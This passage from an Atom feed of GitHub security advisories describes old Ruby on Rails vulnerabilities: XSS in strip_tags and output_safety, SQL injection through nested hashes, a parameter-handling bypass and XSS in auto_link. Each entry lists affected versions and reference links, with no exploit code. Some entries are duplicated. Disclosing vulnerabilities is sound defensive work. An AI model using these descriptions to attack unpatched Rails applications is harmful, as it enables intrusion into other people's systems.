        <title type="html"><![CDATA[[actionpack] actionpack Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7g65-ghrg-hpf5</id>
        <link href="https://github.com/advisories/GHSA-7g65-ghrg-hpf5"/>
        <updated>2025-01-21T15:21:14.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>actionpack/lib/action_view/helpers/sanitize_helper.rb</code> in the <code>strip_tags</code> helper in Ruby on Rails before 2.3.16, 3.0.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3465">https://nvd.nist.gov/vuln/detail/CVE-2012-3465</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a">https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a</a></li>
<li><a href="https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77">https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-7g65-ghrg-hpf5">https://github.com/advisories/GHSA-7g65-ghrg-hpf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g65-ghrg-hpf5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] actionpack Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7g65-ghrg-hpf5</id>
        <link href="https://github.com/advisories/GHSA-7g65-ghrg-hpf5"/>
        <updated>2025-01-21T15:21:14.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>actionpack/lib/action_view/helpers/sanitize_helper.rb</code> in the <code>strip_tags</code> helper in Ruby on Rails before 2.3.16, 3.0.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3465">https://nvd.nist.gov/vuln/detail/CVE-2012-3465</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a">https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a</a></li>
<li><a href="https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77">https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-7g65-ghrg-hpf5">https://github.com/advisories/GHSA-7g65-ghrg-hpf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g65-ghrg-hpf5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activesupport] activesupport Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h835-75hw-pj89</id>
        <link href="https://github.com/advisories/GHSA-h835-75hw-pj89"/>
        <updated>2025-01-21T16:47:01.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>activesupport/lib/active_support/core_ext/string/output_safety.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before , 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3464">https://nvd.nist.gov/vuln/detail/CVE-2012-3464</a></li>
<li><a href="https://github.com/advisories/GHSA-h835-75hw-pj89">https://github.com/advisories/GHSA-h835-75hw-pj89</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/issues/7215">https://github.com/rails/rails/issues/7215</a></li>
<li><a href="https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce">https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce</a></li>
<li><a href="https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23">https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23</a></li>
<li><a href="https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870">https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml</a></li>
<li><a href="https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc">https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h835-75hw-pj89</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activerecord] activerecord vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-76wq-xw4h-f8wj</id>
        <link href="https://github.com/advisories/GHSA-76wq-xw4h-f8wj"/>
        <updated>2025-01-21T15:12:26.000Z</updated>
        <content type="html"><![CDATA[<p>The Active Record component in Ruby on Rails efore 2.3.15, 3.0.x before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2695">https://nvd.nist.gov/vuln/detail/CVE-2012-2695</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml</a></li>
<li><a href="https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J">https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J</a></li>
<li><a href="https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18">https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18</a></li>
<li><a href="https://github.com/advisories/GHSA-76wq-xw4h-f8wj">https://github.com/advisories/GHSA-76wq-xw4h-f8wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76wq-xw4h-f8wj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activerecord] activerecord vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-76wq-xw4h-f8wj</id>
        <link href="https://github.com/advisories/GHSA-76wq-xw4h-f8wj"/>
        <updated>2025-01-21T15:12:26.000Z</updated>
        <content type="html"><![CDATA[<p>The Active Record component in Ruby on Rails efore 2.3.15, 3.0.x before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2695">https://nvd.nist.gov/vuln/detail/CVE-2012-2695</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml</a></li>
<li><a href="https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J">https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J</a></li>
<li><a href="https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18">https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18</a></li>
<li><a href="https://github.com/advisories/GHSA-76wq-xw4h-f8wj">https://github.com/advisories/GHSA-76wq-xw4h-f8wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76wq-xw4h-f8wj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] actionpack allows remote attackers to bypass database-query restrictions, perform NULL checks via crafted request]]></title>
        <id>https://github.com/advisories/GHSA-q34c-48gc-m9g8</id>
        <link href="https://github.com/advisories/GHSA-q34c-48gc-m9g8"/>
        <updated>2025-01-20T16:29:12.000Z</updated>
        <content type="html"><![CDATA[<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>['xyz', nil]</code> values, a related issue to CVE-2012-2660.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2694">https://nvd.nist.gov/vuln/detail/CVE-2012-2694</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/e2d3a87f2c211def?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/e2d3a87f2c211def?dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2694.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2694.yml</a></li>
<li><a href="https://groups.google.com/g/rubyonrails-security/c/jILZ34tAHF4/m/7x0hLH-o0-IJ">https://groups.google.com/g/rubyonrails-security/c/jILZ34tAHF4/m/7x0hLH-o0-IJ</a></li>
<li><a href="https://github.com/rails/rails/commit/2f3bc0467311781ac1ceb2c8c2b09002c8fe143a">https://github.com/rails/rails/commit/2f3bc0467311781ac1ceb2c8c2b09002c8fe143a</a></li>
<li><a href="https://github.com/rails/rails/commit/c202638225519b5e1a03ebe523b109c948fb0e52">https://github.com/rails/rails/commit/c202638225519b5e1a03ebe523b109c948fb0e52</a></li>
<li><a href="https://github.com/advisories/GHSA-q34c-48gc-m9g8">https://github.com/advisories/GHSA-q34c-48gc-m9g8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q34c-48gc-m9g8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Cross site scripting in actionpack Rubygem]]></title>
        <id>https://github.com/advisories/GHSA-q58j-fmvf-9rq6</id>
        <link href="https://github.com/advisories/GHSA-q58j-fmvf-9rq6"/>
        <updated>2025-01-20T16:18:31.000Z</updated>
        <content type="html"><![CDATA[<p>A cross-site scripting vulnerability flaw was found in the <code>auto_link</code> function in Rails before version 3.0.6.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-1497">https://nvd.nist.gov/vuln/detail/CVE-2011-1497</a></li>
<li><a href="https://github.com/rails/rails/blob/38df020c95beca7e12f0188cb7e18f3c37789e20/actionpack/CHANGELOG">https://github.com/rails/rails/blob/38df020c95beca7e12f0188cb7e18f3c37789e20/actionpack/CHANGELOG</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2011/04/06/13">https://www.openwall.com/lists/oss-security/2011/04/06/13</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2011-1497.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2011-1497.yml</a></li>
<li><a href="https://github.com/rails/rails/commit/61ee3449674c591747db95f9b3472c5c3bd9e84d">https://github.com/rails/rails/commit/61ee3449674c591747db95f9b3472c5c3bd9e84d</a></li>
<li><a href="https://github.com/rails/rails/commit/ab764ecbfea31a3b14323283287e2fc80955ace6">https://github.com/rails/rails/commit/ab764ecbfea31a3b14323283287e2fc80955ace6</a></li>
<li><a href="https://github.com/advisories/GHSA-q58j-fmvf-9rq6">https://github.com/advisories/GHSA-q58j-fmvf-9rq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q58j-fmvf-9rq6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-04-22T00:24:28.000Z</published>
    </entry>
</feed>